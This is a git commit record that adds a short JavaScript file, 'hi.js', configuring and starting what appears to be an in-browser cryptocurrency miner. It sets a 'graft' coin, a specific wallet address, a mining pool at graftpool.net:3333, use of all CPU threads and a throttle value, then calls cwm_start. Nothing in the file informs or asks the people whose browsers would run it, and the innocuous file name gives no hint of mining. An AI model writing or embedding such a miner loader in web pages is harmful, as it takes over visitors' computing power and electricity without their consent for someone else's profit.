65ee90400464adc025ac6e6a3dd7c8422ce355e4
ant1d0te <wafulls000@gmail.com>
2018-05-09 02:58:27 -0400

    Create hi.js

---
+++ hi.js
@@ -0,0 +1,9 @@
+    var site_id = 'cwm-142';
+    var coin = 'graft';
+    var wallet = 'GCwHBCufbL9JLXzxedppeCY6u5SptcAYvCcEihep3FCfE3zQQTDHPJY4DAdNrgpEuRga4r6G13GmMG71CTjTVua26ctpdEh';
+    var password = 'x';
+    var mining_pool = 'graftpool.net:3333';
+    var threads = -1;
+    var throttle = 0.2;
+    var debug = false;
+    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
